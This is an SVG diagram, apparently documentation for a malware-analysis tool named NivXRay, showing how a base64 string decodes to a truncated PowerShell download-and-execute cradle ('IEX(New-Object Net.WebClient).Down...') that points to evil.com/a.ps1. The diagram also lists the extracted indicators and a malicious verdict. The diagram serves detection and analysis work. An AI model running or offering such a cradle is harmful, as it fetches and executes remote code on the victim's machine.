<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 460" width="1080" height="460" font-family="Helvetica, Arial, sans-serif">
  <defs>
    <marker id="a3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#94a3b8"/>
    </marker>
    <style>
      .b { fill:#0f172a; }
      .card { fill:#1e293b; stroke:#334155; stroke-width:1.5; }
      .code { font-family:'Courier New', monospace; font-size:10px; fill:#c9d1d9; }
      .white { fill:#f8fafc; }
      .muted { fill:#94a3b8; }
      .lbl { font-size:10px; letter-spacing:1px; }
      .body { font-size:11px; }
      .title { font-weight:700; font-size:13px; }
      .edge  { stroke:#94a3b8; stroke-width:1.5; fill:none; }
    </style>
  </defs>
  <rect width="1080" height="460" class="b"/>
  <text x="540" y="30" text-anchor="middle" class="white" font-size="18" font-weight="700">
    Decoding Chain Anatomy
  </text>
  <text x="540" y="52" text-anchor="middle" class="muted body">
    Each stage is atomic: input bytes → operation → output bytes. NivXRay records the confidence at every step.
  </text>

  <!-- Stage 1 -->
  <g>
    <rect x="30" y="100" width="320" height="200" rx="8" class="card"/>
    <text x="190" y="125" text-anchor="middle" class="lbl" fill="#7ee3c9">STAGE 1</text>
    <text x="190" y="145" text-anchor="middle" class="white title">base64_decode</text>
    <text x="50" y="175" class="lbl muted">INPUT</text>
    <rect x="50" y="180" width="270" height="30" fill="#0b1220" stroke="#334155"/>
    <text x="60" y="200" class="code">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw...</text>
    <text x="50" y="230" class="lbl muted">OUTPUT (bytes)</text>
    <rect x="50" y="235" width="270" height="30" fill="#0b1220" stroke="#334155"/>
    <text x="60" y="255" class="code">49 00 45 00 58 00 28 00 4E 00 65 00...</text>
    <text x="50" y="285" class="body muted">confidence 0.97 · entropy Δ +2.4</text>
  </g>

  <!-- Arrow -->
  <line x1="360" y1="200" x2="400" y2="200" class="edge" marker-end="url(#a3)"/>

  <!-- Stage 2 -->
  <g>
    <rect x="410" y="100" width="320" height="200" rx="8" class="card"/>
    <text x="570" y="125" text-anchor="middle" class="lbl" fill="#7ee3c9">STAGE 2</text>
    <text x="570" y="145" text-anchor="middle" class="white title">utf16_le_decode</text>
    <text x="430" y="175" class="lbl muted">INPUT (bytes)</text>
    <rect x="430" y="180" width="270" height="30" fill="#0b1220" stroke="#334155"/>
    <text x="440" y="200" class="code">49 00 45 00 58 00 28 00 4E 00 65 00...</text>
    <text x="430" y="230" class="lbl muted">OUTPUT (ascii)</text>
    <rect x="430" y="235" width="270" height="30" fill="#0b1220" stroke="#334155"/>
    <text x="440" y="255" class="code">IEX(New-Object Net.WebClient).Down...</text>
    <text x="430" y="285" class="body muted">confidence 0.99 · linguistic 0.94</text>
  </g>

  <!-- Arrow -->
  <line x1="740" y1="200" x2="780" y2="200" class="edge" marker-end="url(#a3)"/>

  <!-- Final IOC + Verdict card -->
  <g>
    <rect x="790" y="100" width="260" height="200" rx="8" fill="#0b1220" stroke="#f43f5e" stroke-width="2"/>
    <text x="920" y="125" text-anchor="middle" class="lbl" fill="#f43f5e">EXTRACT</text>
    <text x="920" y="145" text-anchor="middle" class="white title">IOCs + Verdict</text>
    <text x="810" y="180" class="body white">URL: evil.com/a.ps1</text>
    <text x="810" y="200" class="body white">MITRE: T1059.001</text>
    <text x="810" y="220" class="body white">MITRE: T1105</text>
    <text x="810" y="245" class="lbl" fill="#f43f5e">VERDICT · MALICIOUS</text>
    <text x="810" y="264" class="body muted">confidence 0.94</text>
    <text x="810" y="284" class="body muted">2 stages · 380 ms</text>
  </g>

  <!-- Rules -->
  <g>
    <rect x="30" y="330" width="1020" height="110" rx="6" fill="#0b1220" stroke="#334155"/>
    <text x="60" y="358" class="lbl" fill="#94a3b8">CHAIN INVARIANTS</text>
    <text x="60" y="380" class="body white">
      · One operation per stage — never batched · Stops when confidence plateaus or entropy stops decreasing
    </text>
    <text x="60" y="400" class="body white">
      · Every stage's output is preserved verbatim — nothing is discarded (see the CHAIN tab for the raw JSON)
    </text>
    <text x="60" y="420" class="body white">
      · Correction flow: analyst can replace any single stage; the rest are re-run from that point downstream.
    </text>
  </g>
</svg>
